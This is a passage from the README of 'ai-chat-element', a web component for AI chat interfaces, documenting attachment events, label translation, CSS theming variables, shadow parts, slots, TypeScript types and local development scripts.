  for (const att of e.detail.attachments) {
    const url = await uploadToMyStorage(att.file); // att.file is the raw File
    att.url = url;                                  // sent instead of the data URL
  }
});
```

Rejected files (wrong type / too large / too many) fire
**`ai-chat:attach-rejected`** with `{ file, reason, message }` so you can surface
an error. Style the tray and chips via the `composer-attachments`,
`attachment-chip`, `attachment-remove`, `message-attachments`, and
`message-attachment` parts; replace the button icon via the `attach-icon` slot.

---

## Labels & i18n

Every user-facing and accessibility string lives in one `labels` object. Override
only what you need — the rest keep their defaults. This is also the single hook
for translation.

```js
chat.labels = {
  userName: 'Tú',
  assistantName: 'Asistente',
  emptyHeading: '¿En qué puedo ayudarte?',
  emptyBody: '',
  copy: 'Copiar',
  copied: '¡Copiado!',
  typing: 'El asistente está escribiendo',
  send: 'Enviar mensaje',
  stop: 'Detener',
  jumpToLatest: 'Ir al último mensaje',
  inputLabel: 'Mensaje',
  messagesRegion: 'Mensajes del chat',
  headerTitle: 'Chat',
  clearChat: 'Nuevo chat',
  retry: 'Reintentar',
  emptyResponse: 'Sin respuesta.',
  // Per-message action buttons (copy / edit):
  copyMessage: 'Copiar mensaje',
  edit: 'Editar',
  saveEdit: 'Guardar',
  cancelEdit: 'Cancelar',
  // Image preview ({name} is replaced with the file name):
  previewImage: 'Ver {name}',
  closePreview: 'Cerrar vista previa',
  // Top of a long conversation (has-earlier):
  loadEarlier: 'Cargar mensajes anteriores',
  loadingEarlier: 'Cargando mensajes anteriores…',
  // Attachment strings ({name} is replaced with the filename):
  attach: 'Adjuntar archivos',
  removeAttachment: 'Quitar adjunto',
  attachTooLarge: '{name} es demasiado grande.',
  attachWrongType: '{name} no es un tipo de archivo permitido.',
  attachTooMany: 'Demasiados adjuntos.',
};
```

---

## Theming

Everything is a CSS custom property. **The easiest theming is one line:**

```css
ai-chat {
  --ai-chat-accent: #0d9488; /* cascades to buttons, user bubble, focus, links */
}
```

More knobs (all optional):

```css
ai-chat {
  /* Colors */
  --ai-chat-bg: #fff;
  --ai-chat-fg: #1a1a1a;
  --ai-chat-assistant-bg: #f3f4f6;
  --ai-chat-user-bg: var(--ai-chat-accent);

  /* Corners — ONE knob (--ai-chat-radius, default 8px) rounds every inner
     element together: bubbles, input, code blocks, buttons, avatars. */
  --ai-chat-radius: 8px;          /* 0 = sharp corners everywhere */
  --ai-chat-outer-radius: var(--ai-chat-radius); /* the whole widget's own frame; 0 = square */
  /* Per-surface overrides, each defaulting to --ai-chat-radius: */
  --ai-chat-bubble-radius: var(--ai-chat-radius);
  --ai-chat-input-radius: var(--ai-chat-radius);
  --ai-chat-button-radius: var(--ai-chat-radius);  /* e.g. 50% for circular buttons */

  /* Borders — set to 0 to remove */
  --ai-chat-border-width: 1px;
  --ai-chat-input-border-width: 1px;

  /* Sizing */
  --ai-chat-max-width: 760px;
  --ai-chat-avatar-size: 32px;
  --ai-chat-show-avatars: grid;   /* 'none' to force-hide avatars even if slotted */
  --ai-chat-font-size: 15px;

  /* Input & send button */
  --ai-chat-input-max-height: 200px;  /* how tall the input grows before scrolling */
  --ai-chat-send-size: 34px;          /* the send/stop button inside the box */
  --ai-chat-send-radius: var(--ai-chat-button-radius);

  /* History sidebar (only shown with show-aside) */
  --ai-chat-aside-width: 260px;
  --ai-chat-aside-bg: transparent;
  --ai-chat-aside-padding: 12px;
}
```

> **Corner radius:** every rounded corner derives from `--ai-chat-radius` (8px),
> so changing that one value restyles the whole component consistently. The
> component's _outer_ frame is rounded by default too (`--ai-chat-outer-radius`
> follows `--ai-chat-radius`); set it to `0` for a square frame when your own
> surrounding container already rounds/clips the widget.

> Avatars only appear when you provide a `*-avatar` slot; the column collapses
> otherwise. `--ai-chat-show-avatars: none` force-hides them even when slotted.

### All CSS variables

Every knob, grouped. All are optional — each has a sensible default and most
derive from a parent (e.g. every radius follows `--ai-chat-radius`), so you
usually set just a few.

**Colors**

| Variable                 | Default (light) | Controls                                      |
| ------------------------ | --------------- | --------------------------------------------- |
| `--ai-chat-bg`           | `#ffffff`       | Widget background                             |
| `--ai-chat-fg`           | `#1a1a1a`       | Main text                                     |
| `--ai-chat-muted`        | `#6b7280`       | Secondary text (timestamps, meta)             |
| `--ai-chat-border`       | `#e5e7eb`       | All borders / dividers                        |
| `--ai-chat-accent`       | `#4f46e5`       | Buttons, focus ring, links, user bubble       |
| `--ai-chat-accent-fg`    | `#ffffff`       | Text/icon on the accent                       |
| `--ai-chat-user-bg`      | `= accent`      | User bubble background                        |
| `--ai-chat-user-fg`      | `= accent-fg`   | User bubble text                              |
| `--ai-chat-assistant-bg` | `#f3f4f6`       | Assistant bubble bg (with `assistant-bubble`) |
| `--ai-chat-assistant-fg` | `#1a1a1a`       | Assistant text                                |
| `--ai-chat-code-bg`      | `#0d1117`       | Code block background                         |
| `--ai-chat-code-fg`      | `#e6edf3`       | Code block text                               |
| `--ai-chat-error`        | `#dc2626`       | Error text + retry button                     |

Dark mode swaps `bg`, `fg`, `muted`, `border`, `assistant-bg`, `assistant-fg`
automatically (via `theme` / the OS). Override those same vars under
`ai-chat[theme="dark"]` to customize the dark palette.

**Keyboard focus ring** — shown only for keyboard focus (`:focus-visible`),
never on a mouse click. Subtle by default; tune it to taste.

| Variable                  | Default                     | Controls                                   |
| ------------------------- | --------------------------- | ------------------------------------------ |
| `--ai-chat-focus-color`   | `= accent, softened to 55%` | Ring color on every focusable control      |
| `--ai-chat-focus-width`   | `2px`                       | Ring thickness (`0` removes it)            |
| `--ai-chat-focus-offset`  | `2px`                       | Gap between the control and the ring        |

**Borders** (set any to `0` to remove)

| Variable                          | Default          | Controls                          |
| --------------------------------- | ---------------- | --------------------------------- |
| `--ai-chat-border-width`          | `1px`            | Base width; the others inherit it |
| `--ai-chat-input-border-width`    | `= border-width` | Composer box border               |
| `--ai-chat-composer-border-width` | `0`              | Divider above the composer        |
| `--ai-chat-header-border-width`   | `= border-width` | Divider under the header          |
| `--ai-chat-code-border-width`     | `= border-width` | Code block border                 |
| `--ai-chat-table-border-width`    | `= border-width` | Markdown table borders            |

**Corner radius** (all inherit `--ai-chat-radius`)

| Variable                  | Default           | Controls                                     |
| ------------------------- | ----------------- | -------------------------------------------- |
| `--ai-chat-radius`        | `8px`             | Master radius — everything derives from this |
| `--ai-chat-outer-radius`  | `= radius`        | The widget's own outer frame (`0` = square)  |
| `--ai-chat-bubble-radius` | `= radius`        | Message bubbles                              |
| `--ai-chat-input-radius`  | `= radius`        | Composer box                                 |
| `--ai-chat-button-radius` | `= radius`        | Buttons (e.g. `50%` = circular)              |
| `--ai-chat-send-radius`   | `= button-radius` | Send/stop button                             |
| `--ai-chat-new-chat-radius` | `= button-radius` | Full-width New-chat button in the sidebar  |
| `--ai-chat-jump-radius`   | `50%`             | Jump-to-latest button (circular by default)  |
| `--ai-chat-code-radius`   | `= radius`        | Code blocks                                  |
| `--ai-chat-avatar-radius` | `= radius`        | Avatars                                      |
| `--ai-chat-attachment-radius` | `= radius`    | Attachment chips + inline images             |
| `--ai-chat-action-radius` | `= button-radius` | Per-message action buttons (copy/edit)       |
| `--ai-chat-radius-sm`     | `= radius`        | Small inner corners                          |

> Setting `--ai-chat-button-radius: 50%` for circular icon buttons also reaches
> the sidebar's full-width New-chat button, where `50%` resolves per-axis and
> renders a pill. Set `--ai-chat-new-chat-radius` to keep that one rectangular.

**Fonts & sizing**

| Variable                     | Default           | Controls                                       |
| ---------------------------- | ----------------- | ---------------------------------------------- |
| `--ai-chat-font`             | system UI stack   | Main font family                               |
| `--ai-chat-font-mono`        | system mono stack | Code font family                               |
| `--ai-chat-font-size`        | `15px`            | Base font size                                 |
| `--ai-chat-line-height`      | `1.55`            | Message line height                            |
| `--ai-chat-max-width`        | `760px`           | Max width of messages + composer               |
| `--ai-chat-gap`              | `16px`            | Vertical space between messages                |
| `--ai-chat-avatar-size`      | `32px`            | Avatar width/height                            |
| `--ai-chat-avatar-bg`        | `= assistant-bg`  | Avatar tile behind the picture (`transparent` for a shaped picture) |
| `--ai-chat-button-size`      | `42px`            | Header/floating icon buttons                   |
| `--ai-chat-send-size`        | `34px`            | Send/stop button inside the composer           |
| `--ai-chat-clear-size`       | `32px`            | Compact New-chat icon button (header/floating) |
| `--ai-chat-jump-size`        | `36px`            | Jump-to-latest floating button                 |
| `--ai-chat-input-max-height` | `200px`           | Input grows to here, then scrolls              |
| `--ai-chat-attachment-thumb-size` | `32px`       | Attachment thumbnail size in the composer tray |
| `--ai-chat-attachment-image-max-width` | `320px` | Max width of an inline image in a sent message |
| `--ai-chat-action-size`      | `28px`            | Per-message action button (copy/edit) size     |
| `--ai-chat-action-color`     | `= muted`         | Resting color of the action buttons            |
| `--ai-chat-action-hover-color` | `= fg`          | Action button color on hover                    |
| `--ai-chat-action-hover-bg`  | `fg 8%`           | Action button background on hover              |
| `--ai-chat-preview-backdrop` | `#000 35%`        | Scrim behind the full-size image preview (`0` = none, darker = classic lightbox) |
| `--ai-chat-image-border-width` | `1px`           | Hairline edge on images so a light screenshot still reads on a light chat (`0` removes) |
| `--ai-chat-image-border-color` | `fg 14%`        | Color of that hairline edge                    |
| `--ai-chat-show-avatars`     | `grid`            | `none` force-hides avatars even if slotted     |

**Spacing (padding)**

| Variable                     | Default          | Controls                |
| ---------------------------- | ---------------- | ----------------------- |
| `--ai-chat-bubble-inset-x`   | `14px`           | Horizontal text inset; the name/time label aligns to it |
| `--ai-chat-bubble-padding`   | `6px = inset-x`  | Inside message bubbles (horizontal derives from `bubble-inset-x`) |
| `--ai-chat-input-padding`    | `8px 14px 2px`   | Inside the textarea     |
| `--ai-chat-messages-padding` | `20px 16px`      | Around the message list |
| `--ai-chat-messages-scrollbar-gutter` | `stable` | Reserve the scrollbar's width in the message list (`auto` gives it back when nothing scrolls) |
| `--ai-chat-composer-padding` | `12px 16px 16px` | Around the composer     |
| `--ai-chat-header-padding`   | `10px 16px`      | Inside the header bar   |

**Sidebar** (only shown with `show-aside`)

| Variable                  | Default       | Controls             |
| ------------------------- | ------------- | -------------------- |
| `--ai-chat-aside-width`   | `260px`       | Sidebar column width |
| `--ai-chat-aside-bg`      | `transparent` | Sidebar background   |
| `--ai-chat-aside-padding` | `12px`        | Inside the sidebar   |
| `--ai-chat-aside-scrollbar-gutter` | `auto` | Reserve the scrollbar's width in the history list (`stable` keeps it) |

### All `::part()` hooks

For styling that a variable can't reach, target the shadow parts with
`ai-chat::part(name) { … }`:

`layout`, `root`, `aside`, `aside-list`, `header`, `header-slot`, `header-title`,
`clear-button`, `messages`, `message`, `message-user`, `message-assistant`,
`message-system`, `bubble`, `avatar`, `meta`, `name`, `time`,
`message-attachments`, `message-attachment`,
`message-actions`, `action-button`, `copy-button`, `edit-button`,
`preview`, `preview-image`, `preview-close`, `composer`,
`composer-box`, `composer-attachments`, `attachment-chip`, `attachment-remove`,
`composer-actions`, `composer-actions-start`,
`composer-actions-end`, `attach-button`, `input`, `send-button`, `stop-button`,
`jump-button`, `retry-button`, `load-earlier`, `load-earlier-row`, `empty`,
`empty-icon`, `empty-heading`, `empty-body`, `error`, `empty-response`.

`message-actions` is the per-message actions row; `action-button` targets every
button in it, with `copy-button` / `edit-button` for the built-ins specifically.
While a user message is being edited (`show-edit`), the bubble swaps to an
inline editor exposing `message-edit` (the wrapper), `edit-input` (the
textarea), `edit-actions` (the Save/Cancel row), and `edit-save-button` /
`edit-cancel-button`.

Every message row carries `message` **and** a per-role part, so you can style one
side without a `[data-role]` selector:

```css
ai-chat::part(message-user) { text-align: right; }
ai-chat::part(message-assistant) { opacity: 0.95; }
```

`header` is the built-in bar; `header-slot` is the wrapper around it that also
holds your `header` slot content. When you fill that slot, the wrapper keeps the
bar's frame (padding + bottom divider) so your content lines up with the
built-in — style the frame via `header-slot`, the built-in's own row via `header`.

### All slots

Put your own markup in any of these (`<x slot="name">`):

| Slot                               | Replaces / adds                                                       |
| ---------------------------------- | --------------------------------------------------------------------- |
| `assistant-avatar` / `user-avatar` | Avatar for each side (opt-in; column hides if empty)                  |
| `header`                           | The entire top bar                                                    |
| `aside`                            | Your conversation-history list (the sidebar body)                     |
| `empty`                            | The whole empty state                                                 |
| `empty-icon`                       | The empty-state icon (defaults to a chat-bubble SVG; slot to replace) |
| `composer-actions-start`           | Buttons at the left of the input's action row                         |
| `composer-actions-end`             | Buttons at the right, before send                                     |
| `send-icon` / `stop-icon`          | Send / stop button icons                                              |
| `clear-icon` / `retry-icon`        | New-chat / retry button icons                                         |
| `copy-icon` / `edit-icon`          | Per-message copy / edit action-button icons                          |
| `jump-icon` / `error-icon`         | Jump-to-latest / error icons                                          |
| `attach-icon`                      | Attach-button icon (with `allow-attachments`)                        |

---

## TypeScript

The package ships types. Import them alongside the runtime exports:

```ts
import { AiChat, openAIAdapter } from 'ai-chat-element';
import type {
  ChatMessage,
  ChatTransport,
  StreamChunk,
  Role,
  FinishReason,
  TokenUsage,
  Attachment,
  ChatLabels,
} from 'ai-chat-element';

const labels: Partial<ChatLabels> = { assistantName: 'Acme Assistant' };
const transport: ChatTransport = openAIAdapter({ model: 'gpt-4o-mini', apiKey: '…' });
```

Adapter option types (`OpenAIAdapterOptions`, `AnthropicAdapterOptions`) are
exported too, from either entry point.

For JSX (React), augment `React.JSX` once so `<ai-chat>` typechecks with its
attributes and a `ref` to the real element type:

```ts
import type { AiChat } from 'ai-chat-element';
import type { DetailedHTMLProps, HTMLAttributes } from 'react';

declare module 'react' {
  namespace JSX {
    interface IntrinsicElements {
      'ai-chat': DetailedHTMLProps<HTMLAttributes<AiChat>, AiChat> & {
        theme?: 'auto' | 'light' | 'dark';
        placeholder?: string;
        'show-header'?: boolean;
        // …other attributes as needed; unknowns still work at runtime.
      };
    }
  }
}
```

> Older setups may expect the pre-React-19 global form
> (`declare global { namespace JSX { … } }`). Target whichever `JSX` namespace
> your React version resolves — the modern one lives under `react`. Remember that
> **properties** (`transport`, `messages`, `labels`) and **custom events**
> (`ai-chat:message`) aren't JSX props: set the former on the element ref and
> subscribe to the latter with `addEventListener` (see [React](#react)).

---

## Local development

```bash
npm install
npm run dev       # starts Vite and opens the examples landing page in your browser
npm run build     # build the package into dist/
npm run typecheck
npm test          # runs the suite in a real Chromium (Playwright)
```

Tests run in a **real browser**, not a simulated DOM — this component's behavior
lives in the Shadow DOM (slot projection, `::slotted`, `:host`), which jsdom and
happy-dom don't reproduce faithfully. `npm run test:watch` re-runs on change.

`npm run dev` opens a landing page linking to the playground:

[`examples/playground.html`](examples/playground.html) — every attribute, all 54
CSS variables, every label and slot, live. It's built to be a real testing
surface, not just a demo:

- **Presets** (ChatGPT-ish, Terminal, Soft/pastel) — one click to a complete look.
- **Generated code** — a drawer showing only what you changed from the defaults,
  as CSS + HTML + JS you can paste straight into your app.
- **Scenarios** for the cases that actually break a chat UI: long streams
  (scroll-follow), a slow first token (typing indicator + stop), empty replies,
  a markdown torture test (wide tables, long tokens, unknown code fences), and
  an XSS/sanitization check.
- **Event log** — see exactly what `ai-chat:submit` / `message` / `error` /
  `new-chat` deliver to your app.
- A working, consumer-owned **history sidebar**.

Runs on a built-in **mock transport** by default; switch **Transport** to
**Ollama** to chat with a **real model running locally**
([Ollama](https://ollama.com), free, no API key).

---

## Using an AI assistant to integrate this?

Paste [`AI_USAGE.md`](AI_USAGE.md) into your AI coding assistant (Claude, Copilot,
Cursor, …) when asking it to wire up `ai-chat-element`. It's a condensed,
assistant-friendly spec of the whole API so your assistant integrates it
correctly without guessing.

---

## License

[MPL-2.0](LICENSE) (Mozilla Public License 2.0) — a copyleft license: if you
modify the files in this package you must share those changes under the same
license, but you can freely use the component inside your own (including
proprietary) applications.
